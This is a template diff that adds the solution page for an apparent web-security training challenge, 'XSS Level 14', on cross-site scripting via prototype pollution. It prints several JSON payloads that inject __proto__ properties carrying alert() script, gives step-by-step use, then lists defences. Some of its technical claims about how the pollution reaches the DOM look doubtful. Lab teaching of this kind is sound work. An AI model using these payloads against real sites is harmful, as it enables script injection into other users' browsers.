@@ -1,0 +1,192 @@
+{% extends 'base.html' %}
+
+{% block title %}XSS Level 14 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">XSS Level 14 Solution: XSS via Prototype Pollution</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>
+                        This challenge demonstrates how prototype pollution vulnerabilities can lead to XSS. The application uses a vulnerable merge function that allows an attacker to modify Object.prototype, which can then be used to inject malicious JavaScript.
+                    </p>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-lightbulb-fill me-2 text-warning"></i>Solution</h3>
+                <p>
+                    To solve this challenge, you need to exploit the prototype pollution vulnerability in the merge function and inject a property that will be used to execute JavaScript.
+                </p>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Understanding the Vulnerability</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>Prototype pollution occurs when an attacker can modify JavaScript's Object.prototype, which affects all objects in the application. In this challenge:</p>
+                        <ol>
+                            <li>The application uses a recursive merge function to combine user configurations with default settings.</li>
+                            <li>The merge function is vulnerable because it doesn't check if the property being accessed is "__proto__".</li>
+                            <li>By including "__proto__" in the JSON input, you can modify properties of Object.prototype.</li>
+                            <li>When the application renders the configuration preview, it uses properties from the merged object to create HTML elements.</li>
+                            <li>If you can pollute a property that's used in the HTML rendering, you can inject JavaScript.</li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Identifying the Target</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>Looking at the application code, we can see that it renders a div with the ID "notes-content" that displays a message. This is a good target for our attack.</p>
+                        <pre class="bg-light p-3 rounded"><code>html += '&lt;div id="notes-content"&gt;No notes available for this configuration.&lt;/div&gt;';</code></pre>
+                        <p>We need to find a way to inject JavaScript through this element. One approach is to pollute the "innerHTML" property of Object.prototype, which will be used when setting the content of this div.</p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Crafting the Payload</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>To exploit the prototype pollution vulnerability, we need to craft a JSON payload that includes "__proto__" with our malicious property:</p>
+                        
+                        <h6>Method 1: Polluting innerHTML</h6>
+                        <pre class="bg-light p-3 rounded"><code>{
+  "theme": "dark",
+  "sidebar": true,
+  "notifications": false,
+  "autoSave": true,
+  "refreshRate": 30,
+  "__proto__": {
+    "innerHTML": "&lt;img src=x onerror='alert(\"XSS Level 14 Completed!\")'&gt;"
+  }
+}</code></pre>
+                        
+                        <h6>Method 2: Polluting Other HTML Properties</h6>
+                        <pre class="bg-light p-3 rounded"><code>{
+  "theme": "dark",
+  "sidebar": true,
+  "notifications": false,
+  "autoSave": true,
+  "refreshRate": 30,
+  "__proto__": {
+    "outerHTML": "&lt;script&gt;alert('XSS Level 14 Completed!')&lt;/script&gt;"
+  }
+}</code></pre>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Step-by-Step Solution</h5>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>
+                                <p>Enter a name for your configuration (e.g., "Malicious Config").</p>
+                            </li>
+                            <li>
+                                <p>In the Configuration JSON field, enter the payload that pollutes the innerHTML property:</p>
+                                <pre class="bg-light p-3 rounded"><code>{
+  "theme": "dark",
+  "sidebar": true,
+  "notifications": false,
+  "autoSave": true,
+  "refreshRate": 30,
+  "__proto__": {
+    "innerHTML": "&lt;img src=x onerror='alert(\"XSS Level 14 Completed!\")'&gt;"
+  }
+}</code></pre>
+                            </li>
+                            <li>
+                                <p>Click "Save Configuration" to submit the form.</p>
+                            </li>
+                            <li>
+                                <p>When the configuration preview is rendered, the innerHTML property of Object.prototype will be polluted.</p>
+                            </li>
+                            <li>
+                                <p>When the application sets the innerHTML of the "notes-content" div, it will use the polluted property, which contains our XSS payload.</p>
+                            </li>
+                            <li>
+                                <p>The img tag will fail to load, triggering the onerror event, which executes our JavaScript.</p>
+                            </li>
+                            <li>
+                                <p>The alert will show "XSS Level 14 Completed!", and the challenge will be solved.</p>
+                            </li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Alternative Approaches</h5>
+                    </div>
+                    <div class="card-body">
+                        <h6>1. Using Other DOM Properties</h6>
+                        <p>There are many other DOM properties that can be polluted to achieve XSS:</p>
+                        <pre class="bg-light p-3 rounded"><code>{
+  "__proto__": {
+    "src": "data:text/html,&lt;script&gt;alert('XSS Level 14 Completed!')&lt;/script&gt;"
+  }
+}</code></pre>
+                        
+                        <h6>2. Using Event Handlers</h6>
+                        <pre class="bg-light p-3 rounded"><code>{
+  "__proto__": {
+    "onload": "alert('XSS Level 14 Completed!')"
+  }
+}</code></pre>
+                        
+                        <h6>3. Using Nested Pollution</h6>
+                        <pre class="bg-light p-3 rounded"><code>{
+  "__proto__": {
+    "constructor": {
+      "prototype": {
+        "innerHTML": "&lt;img src=x onerror='alert(\"XSS Level 14 Completed!\")'&gt;"
+      }
+    }
+  }
+}</code></pre>
+                    </div>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-shield-fill-check me-2 text-success"></i>Security Lessons</h3>
+                <div class="card">
+                    <div class="card-body">
+                        <h5>Vulnerabilities Demonstrated</h5>
+                        <ul>
+                            <li><strong>Prototype Pollution:</strong> The ability to modify JavaScript's Object.prototype, affecting all objects in the application.</li>
+                            <li><strong>Unsafe Object Merging:</strong> Recursive merge functions that don't properly check for "__proto__" properties.</li>
+                            <li><strong>DOM-based XSS:</strong> Using polluted properties to inject JavaScript into the DOM.</li>
+                        </ul>
+                        
+                        <h5>Prevention Measures</h5>
+                        <ul>
+                            <li><strong>Object.freeze(Object.prototype):</strong> Prevent modifications to Object.prototype.</li>
+                            <li><strong>Safe Merge Functions:</strong> Use merge functions that explicitly check for and reject "__proto__" and "constructor" properties.</li>
+                            <li><strong>Object.create(null):</strong> Create objects with no prototype to avoid prototype pollution.</li>
+                            <li><strong>JSON Schema Validation:</strong> Validate JSON input against a schema to ensure it doesn't contain unexpected properties.</li>
+                            <li><strong>Content Security Policy (CSP):</strong> Implement a strict CSP to mitigate the impact of XSS.</li>
+                        </ul>
+                        
+                        <h5>Real-World Implications</h5>
+                        <p>
+                            Prototype pollution vulnerabilities have been found in many popular JavaScript libraries and frameworks, including jQuery, Lodash, and Express. These vulnerabilities can lead to various attacks, including XSS, remote code execution, and denial of service. In real-world applications, prototype pollution can be particularly dangerous because it can affect all objects in the application, creating a wide attack surface.
+                        </p>
+                    </div>
+                </div>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('xss_level14') }}" class="btn btn-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
